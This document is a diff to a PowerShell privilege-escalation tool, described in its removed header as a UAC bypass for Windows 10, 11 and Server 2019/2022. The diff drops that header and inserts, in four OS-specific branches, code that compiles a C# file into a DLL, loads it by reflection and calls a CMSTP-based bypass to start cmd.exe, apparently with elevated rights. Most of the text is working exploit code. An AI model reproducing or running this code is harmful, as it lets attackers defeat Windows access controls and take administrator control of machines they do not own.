@@ -1,15 +1,3 @@
-#!-.ps1 
-#
-# Author : P.Hoogeveem
-# Aka    : x0xr00t
-# Build  : 20210809
-# Name   : UAC Bypass Win Server 2019| Win Server 2022 | Win 10 | Win 11
-# Impact : Privesc 
-# Method : DllReflection
-# 
-# Usage  : run the .ps1 file. 
-
-$user=$(cmd.exe /c echo %username%)
 write-Host ""
 write-Host ""
 write-Host ""
@@ -32,6 +20,11 @@ switch ($OSVersion)
 	Write-Host " 00000000000000000000000000000000000000"
         Write-Host " 0 Sl0ppyR00t says it's a Windows 10! 0"
 	Write-Host " 00000000000000000000000000000000000000"
+        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+
+        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
+
+        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
         $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
         $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
         if ($testadmin -eq $false) {
@@ -120,6 +113,11 @@ switch ($OSVersion)
 	Write-Host " 000000000000000000000000000000000000000000000000"
         Write-Host " 0 Sl0ppyR00t says it's a Windows Server 20919! 0"
 	Write-Host " 000000000000000000000000000000000000000000000000"
+        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+
+        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
+
+        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
         $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
         $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
         if ($testadmin -eq $false) {
@@ -208,6 +206,11 @@ switch ($OSVersion)
 	Write-Host " 00000000000000000000000000000000000000"
         Write-Host " 0 Sl0ppyR00t says it's a Windows 11! 0"
 	Write-Host " 00000000000000000000000000000000000000"
+        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+
+        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
+
+        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
         $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
         $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
         if ($testadmin -eq $false) {
@@ -296,6 +299,11 @@ switch ($OSVersion)
 	Write-Host " 00000000000000000000000000000000000000000000000"
         Write-Host " 0 Sl0ppyR00t says it's a Windows Server 2022! 0"
         Write-Host " 00000000000000000000000000000000000000000000000"
+        Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "sl0p.dll"
+
+        [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\sl0p.dll"))
+
+        [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
         $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
         $testadmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
         if ($testadmin -eq $false) {
